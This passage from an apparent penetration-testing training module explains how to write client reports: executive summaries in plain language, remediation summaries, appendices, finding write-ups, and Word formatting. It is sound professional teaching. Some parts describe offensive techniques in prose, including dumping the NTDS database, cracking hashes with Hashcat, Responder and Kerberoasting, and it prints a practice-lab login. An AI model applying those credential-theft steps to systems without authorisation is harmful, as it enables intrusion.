<li><code>Use words that no one has ever heard of before.</code> - Having a large vocabulary is great, but if no one can understand the point you&#39;re trying to make or they have to look up what words mean, all they are is a distraction. Show that off somewhere else.</li>
<li><code>Reference a more technical section of the report.</code> - The reason the executive is reading this might be because they don&#39;t understand the technical details, or they may decide they just don&#39;t have time for it. Also, no one likes having to scroll back and forth throughout the report to figure out what&#39;s going on.</li>
</ul>
<p><strong>Vocabulary Changes</strong></p>
<p>To provide some examples of what it means to &quot;write to a non-technical audience,&quot; we&#39;ve provided some examples below of technical terms and acronyms you may be tempted to use, along with a less technical alternative that could be used instead. This list is not exhaustive nor the &quot;right&quot; way to describe these things. They are meant as examples of how you might describe a technical topic in a more universally understandable way.</p>
<ul>
<li><code>VPN, SSH</code> - a protocol used for secure remote administration</li>
<li><code>SSL/TLS</code> - technology used to facilitate secure web browsing</li>
<li><code>Hash</code> - the output from an algorithm commonly used to validate file integrity</li>
<li><code>Password Spraying</code> - an attack in which a single, easily-guessable password is attempted for a large list of harvested user accounts</li>
<li><code>Password Cracking</code> - an offline password attack in which the cryptographic form of a user’s password is converted back to its human-readable form</li>
<li><code>Buffer overflow/deserialization/etc.</code> - an attack that resulted in remote command execution on the target host</li>
<li><code>OSINT</code> - Open Source Intelligence Gathering, or hunting/using data about a company and its employees that can be found using search engines and other public sources without interacting with a company&#39;s external network</li>
<li><code>SQL injection/XSS</code> - a vulnerability in which input is accepted from the user without sanitizing characters meant to manipulate the application&#39;s logic in an unintended manner</li>
</ul>
<p>These are just a few examples. Your glossary will grow over time as you write more reports. You can also improve this in this area by reading the executive summaries that others have written describing some of the same findings that you typically discover. Doing so can be the catalyst for thinking of something in a different way. You may also receive feedback from the client from time to time about this, and it is important to receive this feedback gracefully and with an open mind. You may be tempted to get defensive (especially if the client is being really aggressive), but at the end of the day, they paid you to build them a useful product. If it isn&#39;t because they can&#39;t understand it, then look at it as an opportunity to practice and grow. Taking client feedback as a personal attack may be difficult not to do, but it&#39;s one of the most valuable things they can give you.</p>
<hr>
<h3 id="example-executive-summary">Example Executive Summary</h3>
<p>Below is a sample executive summary that was taken from the sample report included with this module:</p>
<p>During the internal penetration test against Inlanefreight, Hack The Box Academy identified seven (7) findings that threaten the confidentiality, integrity, and availability of Inlanefreight’s information systems. The findings were categorized by severity level, with five (5) of the findings being assigned a high-risk rating, one (1) medium-risk, and one (1) low risk. There was also one (1) informational finding related to enhancing security monitoring capabilities within the internal network.</p>
<p>The tester found Inlanefreight’s patch and vulnerability management to be well-maintained. None of the findings in this report were related to missing operating system or third-party patches of known vulnerabilities in services and applications that could result in unauthorized access and system compromise. Each flaw discovered during testing was related to a misconfiguration or lack of hardening, with most falling under the categories of weak authentication and weak authorization.</p>
<p>One finding involved a network communication protocol that can be “spoofed” to retrieve passwords for internal users that can be used to gain unauthorized access if an attacker can gain unauthorized access to the network without credentials. In most corporate environments, this protocol is unnecessary and can be disabled. It is enabled by default primarily for small and medium-sized businesses that do not have the resources for a dedicated hostname resolution (the “phonebook” of your network) server. During the assessment, these resources were observed on the network, so Inlanefreight should begin formulating a test plan to disable the dangerous service.</p>
<p>The next issue was a weak configuration involving service accounts that allows any authenticated user to steal a component of the authentication process that can often be guessed offline (via password “cracking”) to reveal the human-readable form of the account’s password. These types of service accounts typically have more privileges than a standard user, so obtaining one of their passwords in clear text could result in lateral movement or privilege escalation and eventually in complete internal network compromise. The tester also noticed that the same password was used for administrator access to all servers within the internal network. This means that if one server is compromised, an attacker can re-use this password to access any server that shares it for administrative access. Fortunately, both of these issues can be corrected without the need for third-party tools. Microsoft’s Active Directory contains settings that can be used to minimize the risk of these resources being abused for the benefit of malicious users.</p>
<p>A webserver was also found to be running a web application that used weak and easily guessable credentials to access an administrative console that can be leveraged to gain unauthorized access to the underlying server. This could be exploited by an attacker on the internal network without needing a valid user account. This attack is very well-documented, so it is an exceedingly likely target that can be particularly damaging, even in the hands of an unskilled attacker. Ideally, direct external access to this service would be disabled, but in the event that it cannot be, it should be reconfigured with exceptionally strong credentials that are rotated frequently. Inlanefreight may also want to consider maximizing the log data collected from this device to ensure that attacks against it can be detected and triaged quickly.</p>
<p>The tester also found shared folders with excessive permissions, meaning that all users in the internal network can access a considerable amount of data. While sharing files internally between departments and users is important to day-to-day business operations, wide-open permissions on file shares may result in unintentional disclosure of confidential information. Even if a file share does not contain any sensitive information today, someone may unwittingly put such data there, thinking it is protected when it isn’t. This configuration should be changed to ensure that users can access only what is necessary to perform their day-to-day duties.</p>
<p>Finally, the tester noticed that testing activities seemed to go mostly unnoticed, which may represent an opportunity to improve visibility into the internal network and indicates that a real-world attacker might remain undetected if internal access is achieved. Inlanefreight should create a remediation plan based on the Remediation Summary section of this report, addressing all high findings as soon as possible according to the needs of the business. Inlanefreight should also consider performing periodic vulnerability assessments if they are not already being performed. Once the issues identified in this report have been addressed, a more collaborative, in-depth Active Directory security assessment may help identify additional opportunities to harden the Active Directory environment, making it more difficult for attackers to move around the network and increasing the likelihood that Inlanefreight will be able to detect and respond to suspicious activity.</p>
<p><strong>Anatomy of the Executive Summary</strong></p>
<p>That wall of text is great and all, but how did we get there? Let&#39;s take a look at the thought process, shall we? For this analysis, we&#39;ll use the sample report you can download from the <code>Resources</code> list.</p>
<p>The first thing you&#39;ll likely want to do is get a list of your findings together and try categorizing the nature of the risk of each one. These categories will be the foundation for what you&#39;re going to discuss in the executive summary. In our sample report, we have the following findings:</p>
<ul>
<li>LLMNR/NBT-NS Response Spoofing - <code>configuration change/system hardening</code></li>
<li>Weak Kerberos Authentication (“Kerberoasting”) - <code>configuration change/system hardening</code></li>
<li>Local Administrator Password Re-Use - <code>behavioral/system hardening</code></li>
<li>Weak Active Directory Passwords - <code>behavioral</code></li>
<li>Tomcat Manager Weak/Default Credentials High - <code>configuration change/system hardening</code></li>
<li>Insecure File Shares - <code>configuration change/system hardening/permissions</code></li>
<li>Directory Listing Enabled - <code>configuration change/system hardening</code></li>
<li>Enhance Security Monitoring Capabilities - <code>configuration change/system hardening</code></li>
</ul>
<p>First, it&#39;s notable that there aren&#39;t any issues in this list linked to missing patches, indicating that the client may have spent considerable time and effort maturing that process. For anyone that&#39;s been a sysadmin before, you&#39;ll know this is no small feat, so we want to make sure to recognize their efforts. This endears you to the sysadmin team by showing their executives that the work they&#39;ve been doing has been effective, and it encourages the executives to continue to invest in people and technology that can help correct some of their issues.</p>
<p>Back to our findings, you can see nearly every finding has some sort of configuration change or system hardening resolution. To collapse it even further, you could start to conclude that this particular client has an immature configuration management process (i.e., they don&#39;t do a very good job of changing default configurations on anything before placing it into production). Since there is a lot to unpack in eight findings, you probably don&#39;t want to just write a paragraph that says &quot;configure things better .&quot;You have some real estate to get into some individual issues and describe some of the impact (the attention-grabbing stuff) of some of the more damaging findings. Developing a configuration management process will take a lot of work, so it&#39;s important to describe what did or could happen if this issue remains unchecked.</p>
<p>As you read each paragraph, you&#39;ll probably be able to map the high-level description to the associated finding to give you some idea of how to describe some of the more technical terms in a way that a non-technical audience can follow without having to look things up. You&#39;ll notice that we do not use acronyms, talk about protocols, mention tickets that grant other tickets, or anything like that. In a few cases, we also describe general anecdotes about what level of effort to expect from remediation, changes that should be made cautiously, workarounds to monitor for a given threat, and the skill level required to perform exploitation. You do NOT have to have a paragraph for every finding. If you have a report with 20 findings, that would get out of control quickly. Try to focus on the most impactful ones.</p>
<p>A couple of nuances to mention as well:</p>
<ul>
<li>Certain observations you make during the assessment can indicate a more significant issue the client may not be aware of. It&#39;s obviously valuable to provide this analysis, but you must be careful how it&#39;s worded to ensure you are not speaking in absolutes because of an assumption.</li>
<li>At the end, you&#39;ll notice a paragraph about how it <strong>seems like</strong> and <strong>indicated that</strong> the client did not detect our testing activity. These qualifiers are important because you aren&#39;t absolutely sure they didn&#39;t. They may have just not told you they did.</li>
<li>Another example of this (in general, not in this executive summary) would be if you wrote something to the effect of &quot;begin documenting system hardening templates and processes .&quot; This insinuates that they have done nothing, which could be insulting if they actually tried and failed. Instead, you might say, &quot;review configuration management processes and address the gaps that led to the issues identified in this report.&quot;</li>
</ul>
<p>Hopefully, this helps clear up some of the thought processes that went into writing this and gives you some ideas on how to think about things differently when trying to describe them. Words have meaning, so make sure you choose them carefully.</p>
<hr>
<h3 id="summary-of-recommendations">Summary of Recommendations</h3>
<p>Before we get into the technical findings, it&#39;s a good idea to provide a <code>Summary of Recommendations</code> or <code>Remediation Summary</code> section. Here we can list our short, medium, and long-term recommendations based on our findings and the current state of the client&#39;s environment. We&#39;ll need to use our experience and knowledge of the client&#39;s business, security budget, staffing considerations, etc., to make accurate recommendations. Our clients will often have input on this section, so we want to get it right, or the recommendations are useless. If we structure this properly, our clients can use it as the basis for a remediation roadmap. If you opt not to do this, be prepared for clients to ask you to prioritize remediation for them. It may not happen all the time, but if you have a report with 15 high-risk findings and nothing else, they&#39;re likely going to want to know which of them is &quot;the most high.&quot; As the saying goes, &quot;when everything is important, nothing is important.&quot;</p>
<p>We should tie each recommendation back to a specific finding and not include any short or medium-term recommendations that are not actionable by remediating findings reported later in the report. Long-term recommendations may map back to informational/best practice recommendations such as <code>&quot;Create baseline security templates for Windows Server and Workstation hosts&quot;</code> but may also be catch-all recommendations such as <code>&quot;Perform periodic Social Engineering engagements with follow-on debriefings and security awareness training to build a security-focused culture within the organization from the top down.&quot;</code></p>
<p>Some findings could have an associated short and long-term recommendation. For example, if a particular patch is missing in many places, that is a sign that the organization struggles with patch management and perhaps does not have a strong patch management program, along with associated policies and procedures. The short-term solution would be to push out the relevant patches, while the long-term objective would be to review patch and vulnerability management processes to address any gaps that would prevent the same issue from cropping up again. In the application security world, it might instead be fixing the code in the short term and in the long term, reviewing the SDLC to ensure security is considered early enough in the development process to prevent these issues from making it into production.</p>
<hr>
<h3 id="findings">Findings</h3>
<p>After the Executive Summary, the <code>Findings</code> section is one of the most important. This section gives us a chance to show off our work, paint the client a picture of the risk to their environment, give technical teams the evidence to validate and reproduce issues and provide remediation advice. We will discuss this section of the report in detail in the next section of this module: <a href="https://academy.hackthebox.com/module/162/section/1536">How to Write up a Finding</a>.</p>
<hr>
<h3 id="appendices">Appendices</h3>
<p>There are appendices that should appear in every report, but others will be dynamic and may not be necessary for all reports. If any of these appendices bloat the size of the report unnecessarily, you may want to consider whether a supplemental spreadsheet would be a better way to present the data (not to mention the enhanced ability to sort and filter).</p>
<hr>
<h3 id="static-appendices">Static Appendices</h3>
<p><strong>Scope</strong></p>
<p>Shows the scope of the assessment (URLs, network ranges, facilities, etc.). Most auditors that the client has to hand your report to will need to see this.</p>
<p><strong>Methodology</strong></p>
<p>Explain the repeatable process you follow to ensure that your assessments are thorough and consistent.</p>
<p><strong>Severity Ratings</strong></p>
<p>If your severity ratings don&#39;t directly map to a CVSS score or something similar, you will need to articulate the criteria necessary to meet your severity definitions. You will have to defend this occasionally, so make sure it is sound and can be backed up with logic and that the findings you include in your report are rated accordingly.</p>
<p><strong>Biographies</strong></p>
<p>If you perform assessments with the intent of fulfilling PCI compliance specifically, the report should include a bio about the personnel performing the assessment with the specific goal of articulating that the consultant is adequately qualified to perform the assessment. Even without compliance obligations, it can help give the client peace of mind that the person doing their assessment knew what they were doing.</p>
<hr>
<h3 id="dynamic-appendices">Dynamic Appendices</h3>
<p><strong>Exploitation Attempts and Payloads</strong></p>
<p>If you&#39;ve ever done anything in incident response, you should know how many artifacts are left behind after a penetration test for the forensics guys to try and sift through. Be respectful and keep track of the stuff you did so that if they experience an incident, they can differentiate what was you versus an actual attacker. If you generate custom payloads, particularly if you drop them on disk, you should also include the details of those payloads here, so the client knows exactly where to go and what to look for to get rid of them. This is especially important for payloads that you cannot clean up yourself.</p>
<p><strong>Compromised Credentials</strong></p>
<p>If a large number of accounts were compromised, it is helpful to list them here (if you compromise the entire domain, it might be a wasted effort to list out every user account instead of just saying &quot;all domain accounts&quot;) so that the client can take action against them if necessary.</p>
<p><strong>Configuration Changes</strong></p>
<p>If you made any configuration changes in the client environment (hopefully you asked first), you should itemize all of them so that the client can revert them and eliminate any risks you introduced into the environment (like disabling EDR or something). Obviously, it&#39;s ideal if you put things back the way you found them yourself and get approval in writing from the client to change things to prevent getting yelled at later on if your change has unintended consequences for a revenue-generating process.</p>
<p><strong>Additional Affected Scope</strong></p>
<p>If you have a finding with a list of affected hosts that would be too much to include with the finding itself, you can usually reference an appendix in the finding to see a complete list of the affected hosts where you can create a table to display them in multiple columns. This helps keep the report clean instead of having a bulleted list several pages long.</p>
<p><strong>Information Gathering</strong></p>
<p>If the assessment is an External Penetration test, we may include additional data to help the client understand their external footprint. This could include whois data, domain ownership information, subdomains, discovered emails, accounts found in public breach data (<a href="https://www.dehashed.com/">DeHashed</a> is great for this), an analysis of the client&#39;s SSL/TLS configurations, and even a listing of externally accessible ports/services (in a large scope external you&#39;d likely want to make a supplementary spreadsheet). This data can be beneficial in a low-to-no-finding report but should convey some sort of value to the client and not just be &quot;fluff.&quot;</p>
<p><strong>Domain Password Analysis</strong></p>
<p>If you&#39;re able to gain Domain Admin access and dump the NTDS database, it&#39;s a good idea to run this through Hashcat with multiple wordlists and rules and even brute-force NTLM up through eight characters if your password cracking rig is powerful enough. Once you&#39;ve exhausted your cracking attempts, a tool such as <a href="https://github.com/clr2of8/DPAT">DPAT</a> can be used to produce a nice report with various statistics. You may want just to include some key stats from this report (i.e., number of hashes obtained, number and percentage cracked, number of privileged accounts cracks (think Domain Admins and Enterprise Admins), top X passwords, and the number of passwords cracked for each character length). This can help drive home themes in the Executive Summary and Findings sections regarding weak passwords. You may also wish to provide the client with the entire DPAT report as supplementary data.</p>
<hr>
<h3 id="report-type-differences">Report Type Differences</h3>
<p>In this module, we are mainly covering all of the elements that should be included in an Internal Penetration Test report or an External Penetration Test that ended with internal compromise. Some of the elements of the report (such as the Attack Chain) will likely not apply in an External Penetration Test report where there was no internal compromise. This type of report would focus more on information gathering, OSINT data, and externally exposed services. It would likely not include appendices such as compromised credentials, configuration changes, or a domain password analysis. A Web Application Security Assessment (WASA) report would probably focus mainly on the Executive Summary and Findings sections and would likely emphasize the OWASP Top 10. A physical security assessment, red team assessment, or social engineering engagement would be written in more of a narrative format. It&#39;s a good practice to create templates for various types of assessments, so you have them ready to go when that particular type of assessment comes up.</p>
<p>Now that we&#39;ve covered the elements of a report let&#39;s dig into how to write up a finding effectively.</p>
<h2 id="how-to-write-up-a-finding">How to Write Up a Finding</h2>
<hr>
<p>The <code>Findings</code> section of our report is the &quot;meat.&quot; This is where we get to show off what we found, how we exploited them, and give the client guidance on how to remediate the issues. The more detail we can put into each finding, the better. This will help technical teams reproduce the finding on their own and then be able to test that their fix worked. Being detailed in this section will also help whoever is tasked with the post-remediation assessment if the client contracts your firm to perform it. While we&#39;ll often have &quot;stock&quot; findings in some sort of database, it&#39;s essential to tweak them to fit our client&#39;s environment to ensure we aren&#39;t mispresenting anything.</p>
<hr>
<h3 id="breakdown-of-a-finding">Breakdown of a Finding</h3>
<p>Each finding should have the same general type of information that should be customized to your client&#39;s specific circumstances. If a finding is written to suit several different scenarios or protocols, the final version should be adjusted to only reference the particular circumstances you identified. <code>&quot;Default Credentials&quot;</code> could have different meanings for risk if it affects a DeskJet printer versus the building&#39;s HVAC control or another high-impact web application. At a minimum, the following information should be included for each finding:</p>
<ul>
<li>Description of the finding and what platform(s) the vulnerability affects</li>
<li>Impact if the finding is left unresolved</li>
<li>Affected systems, networks, environments, or applications</li>
<li>Recommendation for how to address the problem</li>
<li>Reference links with additional information about the finding and resolving it</li>
<li>Steps to reproduce the issue and the evidence that you collected</li>
</ul>
<p>Some additional, optional fields include:</p>
<pre><code>-<span class="ruby"> CVE
</span>-<span class="ruby"> OWASP, MITRE IDs
</span>-<span class="ruby"> CVSS <span class="hljs-keyword">or</span> similar score
</span>-<span class="ruby"> Ease of exploitation <span class="hljs-keyword">and</span> probability of attack
</span>-<span class="ruby"> Any other information that might help learn about <span class="hljs-keyword">and</span> mitigate the attack</span>
</code></pre><hr>
<h3 id="showing-finding-reproduction-steps-adequately">Showing Finding Reproduction Steps Adequately</h3>
<p>As mentioned in the previous section regarding the Executive Summary, it&#39;s important to remember that even though your point-of-contact might be reasonably technical, if they don&#39;t have a background specifically in penetration testing, there is a pretty decent chance they won&#39;t have any idea what they&#39;re looking at. They may have never even heard of the tool you used to exploit the vulnerability, much less understand what&#39;s important in the wall of text it spits out when the command runs. For this reason, it&#39;s crucial to guard yourself against taking things for granted and assuming people know how to fill in the blanks themselves. If you don&#39;t do this correctly, again, this will erode the effectiveness of your deliverable, but this time in the eyes of your technical audience. Some concepts to consider:</p>
<ul>
<li>Break each step into its own figure. If you perform multiple steps in the same figure, a reader unfamiliar with the tools being used may not understand what is taking place, much less have an idea of how to reproduce it themselves.</li>
<li>If setup is required (e.g., Metasploit modules), capture the full configuration so the reader can see what the exploit config should look like before running the exploit. Create a second figure that shows what happens when you run the exploit.</li>
<li>Write a narrative between figures describing what is happening and what is going through your head at this point in the assessment. Do not try to explain what is happening in the figure with the caption and have a bunch of consecutive figures.</li>
<li>After walking through your demonstration using your preferred toolkit, offer alternative tools that can be used to validate the finding if they exist (just mention the tool and provide a reference link, don&#39;t do the exploit twice with more than one tool).</li>
</ul>
<p>Your primary objective should be to present evidence in a way that is understandable and actionable to the client. Think about how the client will use the information you&#39;re presenting. If you&#39;re showing a vulnerability in a web application, a screenshot of Burp isn&#39;t the best way to present this information if you&#39;re crafting your own web requests. The client will probably want to copy/paste the payload from your testing to recreate it, and they can&#39;t do that if it&#39;s just a screenshot.</p>
<p>Another critical thing to consider is whether your evidence is completely and utterly defensible. For example, if you&#39;re trying to demonstrate that information is being transmitted in clear text because of the use of basic authentication in a web application, it&#39;s insufficient just to screenshot the login prompt popup. That shows that basic auth is in place but offers no proof that information is being transmitted in the clear. In this instance, showing the login prompt with some fake credentials entered into it, and the clear text credentials in a Wireshark packet capture of the human-readable authentication request leaves no room for debate. Similarly, if you&#39;re trying to demonstrate the presence of a vulnerability in a particular web application or something else with a GUI (like RDP), it&#39;s important to capture either the URL in the address bar or output from an <code>ifconfig</code> or <code>ipconfig</code> command to prove that it&#39;s on the client&#39;s host and not some random image you downloaded from Google. Also, if you&#39;re screenshotting your browser, turn your bookmarks bar off and disable any unprofessional browser extensions or dedicate a specific web browser to your testing.</p>
<p>Below is an example of how we could show the steps for capturing a hash using the Responder tool and cracking it offline using Hashcat. While it is not 100% necessary, it can be good to list alternate tools as we did with this finding. The client may be working from a Windows box and find a PowerShell script or executable to be more user-friendly or may be more familiar with another toolset. Note that we also redacted the hash and cleartext passwords as this report could be passed around to many different audiences, so it can be best to redact credentials wherever possible.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/162/evidence\_example.png" alt="image"></p>
<hr>
<h3 id="effective-remediation-recommendations">Effective Remediation Recommendations</h3>
<p><strong>Example 1</strong></p>
<ul>
<li><code>Bad</code>: Reconfigure your registry settings to harden against X.</li>
<li><code>Good</code>: To fully remediate this finding, the following registry hives should be updated with the specified values. Note that changes to critical components like the registry should be approached with caution and tested in a small group prior to making large-scale changes.<ul>
<li><code>[list the full path to the affected registry hives]</code><ul>
<li>Change value X to value Y</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><strong>Rationale</strong></p>
<p>While the &quot;bad&quot; example is at least somewhat helpful, it&#39;s fairly lazy, and you&#39;re squandering a learning opportunity. Once again, the reader of this report may not have the depth of experience in Windows as you, and giving them a recommendation that will require hours&#39; worth of work for them to figure out how to do it is only going to frustrate them. Do your homework and be as specific as reasonably possible. Doing so has the following benefits:</p>
<ul>
<li>You learn more this way and will be much more comfortable answering questions during the report review. This will reinforce the client&#39;s confidence in you and will be knowledge that you can leverage on future assessments and to help level up your team.</li>
<li>The client will appreciate you doing the research for them and outlining specifically what needs to be done so they can be as efficient as possible. This will increase the likelihood that they will ask you to do future assessments and recommend you and your team to their friends.</li>
</ul>
<p>It&#39;s also worth drawing attention to the fact that the &quot;good&quot; example includes a warning that changing something as important as the registry carries its own set of risks and should be performed with caution. Again, this indicates to the client that you have their best interests in mind and genuinely want them to succeed. For better or worse, there will be clients that will blindly do whatever you tell them to and will not hesitate to try and hold you accountable if doing so ends up breaking something.</p>
<p><strong>Example 2</strong></p>
<ul>
<li><code>Bad</code>: Implement <code>[some commercial tool that costs a fortune]</code> to address this finding.</li>
<li><code>Good</code>: There are different approaches to addressing this finding. <code>[Name of the affected software vendor]</code> has published a workaround as an interim solution. For the sake of brevity, a link to the walkthrough has been provided in the reference links below. Alternatively, there are commercial tools available that would make it possible to disable the vulnerable functionality in the affected software altogether, but these tools may be cost-prohibitive.</li>
</ul>
<p><strong>Rationale</strong></p>
<p>The &quot;bad&quot; example gives the client no way to remediate this issue without spending a lot of money that they may not have. While the commercial tool may be the easiest solution far and away, many clients will not have the budget to do that and need an alternative solution. The alternative solution may be a bandaid or extraordinarily cumbersome, or both, but it will at least buy the client some time until the vendor has released an official fix.</p>
<hr>
<h3 id="selecting-quality-references">Selecting Quality References</h3>
<p>Each finding should include one or more external references for further reading on a particular vulnerability or misconfiguration. Some criteria that enhance the usefulness of a reference:</p>
<ul>
<li>A vendor-agnostic source is helpful. Obviously, if you find an ASA vulnerability, a Cisco reference link makes sense, but I wouldn&#39;t lean on them for a writeup on anything outside of networking. If you reference an article written by a product vendor, chances are the article&#39;s focus will be telling the reader how their product can help when all the reader wants is to know how to fix it themselves.</li>
</ul>
<p>A thorough walkthrough or explanation of the finding and any recommended workarounds or mitigations is preferable. Don&#39;t choose articles behind a paywall or something where you only get part of what you need without paying.</p>
<ul>
<li>Use articles that get to the point quickly. This isn&#39;t a recipe website, and no one cares how often your grandmother used to make those cookies. We have problems to solve, and making someone dig through the entire NIST 800-53 document or an RFC is more annoying than helpful.</li>
<li>Choose sources that have clean websites and don&#39;t make you feel like a bunch of crypto miners are running in the background or ads pop up everywhere.</li>
<li>If possible, write some of your own source material and blog about it. The research will aid you in explaining the impact of the finding to your clients, and while the infosec community is pretty helpful, it&#39;d be preferable not to send your clients to a competitor&#39;s website.</li>
</ul>
<hr>
<h3 id="example-findings">Example Findings</h3>
<p>Below are a few example findings. The first two are examples of issues that may be discovered during an Internal Penetration Test. As you can see, each finding includes all of the key elements: a detailed description to explain what is going on, the impact to the environment if the finding is left unfixed, the hosts affected by the issue (or the entire domain), remediation advice that is generic, does not recommend specific vendor tools and gives several options for remediation. Finally, the reference links are from well-known, reputable sources that will likely not be taken down anytime soon as a personal blog may.</p>
<p>A note on the formatting: This could potentially be a hotly contested topic. The example findings here have been laid out in a tabular format, but if you&#39;ve ever worked in Word or tried to automate some of your report generation, you know that tables can be a nightmare to deal with. For this reason, others opt to separate sections of their findings with different heading levels. Either of these approaches is acceptable because what is important is whether your message gets across to the reader and how easy it is to pick out the visual cues for when one finding ends and another begins; readability is paramount. If you can accomplish this, colors, layout, order, and even section names can be adjusted.</p>
<p><strong>Weak Kerberos Authentication (“Kerberoasting”)</strong></p>
<p><img src="https://academy.hackthebox.com/storage/modules/162/kbroast.png" alt="image"></p>
<p><strong>Tomcat Manager Weak/Default Credentials</strong></p>
<p><img src="https://academy.hackthebox.com/storage/modules/162/tomcat\_finding.png" alt="image"></p>
<p><strong>Poorly Written Finding</strong></p>
<p>Below is an example of a poorly written finding which has several issues:</p>
<ul>
<li>Formatting is sloppy with the CWE link</li>
<li>No CVSS score is filled in (not mandatory, but if your report template uses it, you should fill it in)</li>
<li>The Description does not clearly explain the issue or root cause</li>
<li>The security impact is vague and generic</li>
<li>The Remediation section is not clear and actionable</li>
</ul>
<p>If I am reading this report, I can see that this finding is bad (because it&#39;s red), but why do I care? What do I do about it? Each finding should present the issue in detail and educate the reader on the issue at hand (they may very likely have never heard of Kerberoasting or some other attack). Clearly articulate the security risk and <code>why</code> this needs to be remediated and some actionable remediation recommendations.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/162/kbroast\_weak.png" alt="image"></p>
<hr>
<h3 id="hands-on-practice">Hands-On Practice</h3>
<p>The target VM that can be spawned in this section has a copy of the <a href="https://github.com/blacklanternsecurity/writehat">WriteHat</a> reporting tool running. This is a helpful tool for building a findings database and generating customized reports. While we do not endorse any one specific tool in this module, many reporting tools are similar, so playing around with WriteHat will give you a good idea of how these types of tools work. Practice adding findings to the database, building and generating a report, etc. We prepopulated the findings database with some common findings categories, and some of the findings included in the sample report attached to this module. Experiment with it as much as you like and practice the skills taught in this section. Keep in mind that anything you enter into the tool will not be saved once the target expires, so if you write up any practice findings, make sure to keep a copy locally. This tool will also be helpful for the hands-on guided lab at the end of this module.</p>
<p>Once the target spawns, browse to <code>https://&lt; target IP &gt;</code> and log in with the credentials <code>htb-student:HTB_@cademy_stdnt!</code>.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/162/writehat.png" alt=""></p>
<p>Practice writing up findings and exploring the tool. You may even decide you like it enough to use it as part of your workflow. One idea would be to install a copy locally and practice writing findings for issues you discover in Academy module labs or boxes/labs on the HTB main platform.</p>
<hr>
<h3 id="nearly-there">Nearly There</h3>
<p>Now that we&#39;ve covered how to stay organized during a penetration test, types of reports, the standard components of a report, and how to write up a finding, we have some reporting tips/tricks to share with you from our collective experience in the field.</p>
<h2 id="reporting-tips-and-tricks">Reporting Tips and Tricks</h2>
<hr>
<p>Reporting is an essential part of the penetration testing process but, if poorly managed, can become very tedious and prone to mistakes. One key aspect of reporting is that we should be working on building our report from the onset. This starts with our organizational structure/notetaking setup, but there are times when we may be running a long discovery scan where we could fill out templated parts of the report such as contact information, client name, scope, etc. While testing, we can be writing up our Attack Chain and each finding with all of the required evidence so we don&#39;t have to scramble to recapture evidence after the assessment is over. Working as we go will ensure that our report isn&#39;t rushed and comes back from QA with loads of changes in red.</p>
<hr>
<h3 id="templates">Templates</h3>
<p>This should go without saying, but we shouldn&#39;t be recreating the wheel with every report we write. It&#39;s best to have a blank report template for every assessment type we perform (even the more obscure ones!). If we are not using a reporting tool and just working in old-fashioned MS Word, we can always build a report template with macros and placeholders to fill in some of the data points we fill out for every assessment. We should work with blank templates every time and not just modify a report from a previous client, as we could risk leaving another client&#39;s name in the report or other data that does not match our current environment. This type of error makes us look amateur and is easily avoidable.</p>
<hr>
<h3 id="ms-word-tips-tricks">MS Word Tips &amp; Tricks</h3>
<p>Microsoft Word can be a pain to work with, but there are several ways we can make it work for us to make our lives easier, and in our experience, it&#39;s easily the least of the available evils. Here are a few tips &amp; tricks that we&#39;ve gathered over the years on the road to becoming an MS Word guru. First, a few comments:</p>
<ul>
<li>The tips and tricks here are described for Microsoft Word. Some of the same functionality may also exist in LibreOffice, but you&#39;ll have to <code>[preferred search engine]</code> your way around to figure out if it&#39;s possible.</li>
<li>Do yourself a favor, use Word for Windows, and explicitly avoid using Word for Mac. If you want to use a Mac as your testing platform, get a Windows VM in which you can do your reporting. Mac Word lacks some basic features that Windows Word has, there is no VB Editor (in case you need to use macros), and it cannot natively generate PDFs that look and work correctly (it trims the margins and breaks all of the hyperlinks in the table of contents), to name a few.</li>
<li>There are many more advanced features like font-kerning that you can use to crank your fancy to 11 if you&#39;d like, but we&#39;re going to try to stay focused on the things that improve efficiency and will leave it to the reader (or their marketing department) to determine specific cosmetic preferences.</li>
</ul>
<p>Let&#39;s cover the basics:</p>
<ul>
<li><code>Font styles</code><ul>
<li>You should be getting as close as you possibly can to a document without any &quot;direct formatting&quot; in it. What I mean by direct formatting is highlighting text and clicking the button to make it bold, italics, underlined, colored, highlighted, etc. &quot;But I thought you &quot;just&quot; said we&#39;re only going to focus on stuff that improves efficiency.&quot; We are. If you use font styles and you find that you&#39;ve overlooked a setting in one of your headings that messes up the placement or how it looks, if you update the style itself, it updates &quot;all&quot; instances of that style used in the entire document instead of you having to go manually update all 45 times you used your random heading (and even then, you might miss some).</li>
</ul>
</li>
<li><code>Table styles</code><ul>
<li>Take everything I just said about font styles and apply it to tables. Same concept here. It makes global changes much easier and promotes consistency throughout the report. It also generally makes everyone using the document less miserable, both as an author and as QA.</li>
</ul>
</li>
<li><code>Captions</code><ul>
<li>Use the built-in caption capability (right-click an image or highlighted table and select &quot;Insert Caption...&quot;) if you&#39;re putting captions on things. Using this functionality will cause the captions to renumber themselves if you have to add or remove something from the report, which is a GIGANTIC headache. This typically has a built-in font style that allows you to control how the captions look.</li>
</ul>
</li>
<li><code>Page numbers</code><ul>
<li>Page numbers make it much easier to refer to specific areas of the document when collaborating with the client to answer questions or clarify the report&#39;s content (e.g., &quot;What does the second paragraph on page 12 mean?&quot;). It&#39;s the same for clients working internally with their teams to address the findings.</li>
</ul>
</li>
<li><code>Table of Contents</code><ul>
<li>A Table of Contents is a standard component of a professional report. The default ToC is probably fine, but if you want something custom, like hiding page numbers or changing the tab leader, you can select a custom ToC and tinker with the settings.</li>
</ul>
</li>
<li><code>List of Figures/Tables</code><ul>
<li>It&#39;s debatable whether a List of Figures or Tables should be in the report. This is the same concept as a Table of Contents, but it only lists the figures or tables in the report. These trigger off the captions, so if you&#39;re not using captions on one or the other, or both, this won&#39;t work.</li>
</ul>
</li>
<li><code>Bookmarks</code><ul>
<li>Bookmarks are most commonly used to designate places in the document that you can create hyperlinks to (like an appendix with a custom heading). If you plan on using macros to combine templates, you can also use bookmarks to designate entire sections that can be automatically removed from the report.</li>
</ul>
</li>
<li><code>Custom Dictionary</code><ul>
<li>You can think of a custom dictionary as an extension of Word&#39;s built-in AutoCorrect feature. If you find yourself misspelling the same words every time you write a report or want to prevent embarrassing typos like writing &quot;pubic&quot; instead of &quot;public,&quot; you can add these words to a custom dictionary, and Word will automatically replace them for you. Unfortunately, this feature does not follow the template around, so people will have to configure their own.</li>
</ul>
</li>
<li><code>Language Settings</code><ul>
